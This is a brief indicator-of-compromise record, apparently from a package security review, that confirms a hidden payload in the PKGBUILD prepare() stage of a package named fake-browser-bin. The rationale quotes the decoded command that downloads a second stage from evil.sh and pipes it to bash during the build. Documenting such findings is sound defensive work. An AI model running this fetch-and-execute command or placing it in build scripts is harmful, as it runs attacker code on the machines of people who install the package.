ioc_entries.provenance: the base64-decoded payload in PKGBUILD prepare()

rationale: The runtime supplies a decoded payload (curl -s http://evil.sh/stage2 | bash), and the package's prepare() stage actually executes this during build: it decodes the base64 string and pipes it to bash, so curl runs against evil.sh at build time - a real hidden payload that runs code the package should not.
title: Confirmed IOC: fake-browser-bin
